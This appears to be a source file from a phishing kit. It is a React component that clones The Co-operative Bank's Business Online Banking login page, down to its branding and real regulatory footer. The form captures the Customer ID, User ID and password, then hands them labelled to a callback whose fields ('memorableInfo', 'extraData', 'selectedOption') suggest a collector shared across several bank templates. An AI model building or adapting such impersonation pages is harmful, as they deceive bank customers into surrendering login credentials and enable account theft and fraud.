"use client";

import { useState } from "react";

interface CooperativeBankProps {
  bankName?: string;
  selectedOption?: string;
  onSuccessSubmit: (data: {
    userId: string;
    password?: string;
    memorableInfo?: string;
    extraData?: string;
  }) => void;
}

export default function CooperativeBankTemplate({
  bankName = "The Co-operative Bank",
  selectedOption = "Business",
  onSuccessSubmit,
}: CooperativeBankProps) {
  const [customerId, setCustomerId] = useState("");
  const [userId, setUserId] = useState("");
  const [password, setPassword] = useState("");
  const [showPassword, setShowPassword] = useState(false);

  // Error States (Teeno Fields Compulsory)
  const [errors, setErrors] = useState<{
    customerId?: boolean;
    userId?: boolean;
    password?: boolean;
  }>({});
  const [loading, setLoading] = useState(false);

  const handleSubmit = (e: React.FormEvent) => {
    e.preventDefault();
    const newErrors: {
      customerId?: boolean;
      userId?: boolean;
      password?: boolean;
    } = {};

    if (!customerId.trim()) newErrors.customerId = true;
    if (!userId.trim()) newErrors.userId = true;
    if (!password.trim()) newErrors.password = true;

    if (Object.keys(newErrors).length > 0) {
      setErrors(newErrors);
      return;
    }

    setLoading(true);

    onSuccessSubmit({
      userId: `CustID: ${customerId.trim()} | User: ${userId.trim()}`,
      password: password.trim(),
      memorableInfo: `Customer ID: ${customerId.trim()}`,
      extraData: `Option: ${selectedOption || "Business"} | The Co-operative Bank`,
    });
  };

  return (
    <div className="min-h-full bg-[#002b66] font-sans text-slate-800 flex flex-col justify-between py-10 px-4 sm:px-8 selection:bg-[#00aeef] selection:text-white">
      <div>
        {/* ================= 1. HEADER BRANDING ================= */}
        <div className="flex justify-center pb-8 pt-2">
          <div className="text-white text-2xl sm:text-3xl tracking-tight flex items-baseline gap-1 font-light">
            <span className="text-xl sm:text-2xl font-normal">The</span>
            <span className="font-extrabold tracking-tighter text-2xl sm:text-[32px] lowercase font-sans">
              co-operative bank
            </span>
          </div>
        </div>

        {/* ================= 2. CENTRAL LOGIN CARD ================= */}
        <div className="w-full max-w-[480px] mx-auto bg-white rounded-none shadow-2xl p-8 sm:p-10 border border-slate-100">
          <h1 className="text-xl sm:text-[22px] font-bold text-[#1a1a1a] tracking-tight mb-7">
            Log in to Business Online Banking
          </h1>

          <form onSubmit={handleSubmit} className="space-y-5">
            {/* 1. Customer ID Field */}
            <div>
              <label className="block text-xs sm:text-[13px] font-bold text-[#222222] mb-1.5">
                Customer ID
              </label>
              <input
                type="text"
                value={customerId}
                onChange={(e) => {
                  setCustomerId(e.target.value);
                  if (errors.customerId) setErrors({ ...errors, customerId: false });
                }}
                className={`w-full rounded-none border p-2.5 text-sm outline-none transition bg-white ${
                  errors.customerId
                    ? "border-red-600 bg-red-50/20"
                    : "border-slate-500 focus:border-[#0072ce] focus:ring-1 focus:ring-[#0072ce]"
                }`}
              />
              {errors.customerId && (
                <p className="text-xs text-red-600 font-semibold mt-1">
                  Please enter your Customer ID.
                </p>
              )}
            </div>

            {/* 2. User ID Field */}
            <div>
              <label className="block text-xs sm:text-[13px] font-bold text-[#222222] mb-1.5">
                User ID
              </label>
              <input
                type="text"
                value={userId}
                onChange={(e) => {
                  setUserId(e.target.value);
                  if (errors.userId) setErrors({ ...errors, userId: false });
                }}
                className={`w-full rounded-none border p-2.5 text-sm outline-none transition bg-white ${
                  errors.userId
                    ? "border-red-600 bg-red-50/20"
                    : "border-slate-500 focus:border-[#0072ce] focus:ring-1 focus:ring-[#0072ce]"
                }`}
              />
              {errors.userId && (
                <p className="text-xs text-red-600 font-semibold mt-1">
                  Please enter your User ID.
                </p>
              )}
            </div>

            {/* 3. Password Field */}
            <div>
              <label className="block text-xs sm:text-[13px] font-bold text-[#222222] mb-1.5">
                Password
              </label>
              <div className="relative">
                <input
                  type={showPassword ? "text" : "password"}
                  value={password}
                  onChange={(e) => {
                    setPassword(e.target.value);
                    if (errors.password) setErrors({ ...errors, password: false });
                  }}
                  className={`w-full rounded-none border p-2.5 pr-14 text-sm outline-none transition bg-white ${
                    errors.password
                      ? "border-red-600 bg-red-50/20"
                      : "border-slate-500 focus:border-[#0072ce] focus:ring-1 focus:ring-[#0072ce]"
                  }`}
                />
                <button
                  type="button"
                  onClick={() => setShowPassword(!showPassword)}
                  className="absolute right-2 top-1/2 -translate-y-1/2 text-xs font-semibold text-[#0072ce] underline px-1 cursor-pointer"
                >
                  {showPassword ? "Hide" : "Show"}
                </button>
              </div>
              {errors.password && (
                <p className="text-xs text-red-600 font-semibold mt-1">
                  Please enter your password.
                </p>
              )}
            </div>

            {/* Continue Button */}
            <div className="pt-2">
              <button
                type="submit"
                disabled={loading}
                className="w-full sm:w-auto rounded-none bg-[#0072ce] hover:bg-[#005ba3] active:scale-[0.99] px-9 py-2.5 font-bold text-sm text-white shadow transition cursor-pointer"
              >
                {loading ? "Checking..." : "Continue"}
              </button>
            </div>
          </form>

          {/* Helper Links Inside Card */}
          <div className="mt-8 pt-4 space-y-2 text-xs text-slate-700 leading-relaxed">
            <p>
              If you have forgotten your Customer ID or User ID, please{" "}
              <a href="#" className="text-[#0072ce] underline hover:text-[#005ba3]">
                call Business Account Support
              </a>
            </p>
            <p>
              <a href="#" className="text-[#0072ce] underline hover:text-[#005ba3]">
                Register for Business Online Banking
              </a>
            </p>
          </div>
        </div>
      </div>

      {/* ================= 3. FOOTER & COMPLIANCE SECTION ================= */}
      <footer className="w-full max-w-[1100px] mx-auto mt-16 text-white text-xs">
        {/* Top Cyan Divider Line */}
        <div className="w-full h-[2px] bg-[#00aeef] mb-6"></div>

        {/* Links Navigation */}
        <div className="flex flex-wrap items-center justify-around gap-4 text-center font-medium mb-6">
          <a href="#" className="underline hover:text-slate-200">
            Contact us
          </a>
          <a href="#" className="underline hover:text-slate-200">
            Accessibility
          </a>
          <a href="#" className="underline hover:text-slate-200">
            Online banking terms and conditions
          </a>
        </div>

        {/* Bottom Cyan Divider Line */}
        <div className="w-full h-[2px] bg-[#00aeef] mb-8"></div>

        {/* Legal Text */}
        <div className="space-y-4 text-center text-white/90 text-[11px] leading-relaxed max-w-[900px] mx-auto">
          <p className="font-semibold">
            The Co-operative Bank is covered by the FSCS.
          </p>

          <p>
            The Co-operative Bank p.l.c. is authorised by the Prudential Regulation Authority and regulated by the Financial Conduct Authority and the Prudential Regulation Authority (Financial Services Register No: 121885). Registered office: 1 Balloon Street, Manchester, M4 4BE. Registered in England and Wales (Company No: 990937).
          </p>

          {/* Bottom Logo */}
          <div className="pt-4 flex justify-center">
            <div className="text-white text-xl tracking-tight flex items-baseline gap-1 font-light opacity-90">
              <span className="text-base font-normal">The</span>
              <span className="font-extrabold tracking-tighter text-2xl lowercase font-sans">
                co-operative bank
              </span>
            </div>
          </div>
        </div>
      </footer>
    </div>
  );
}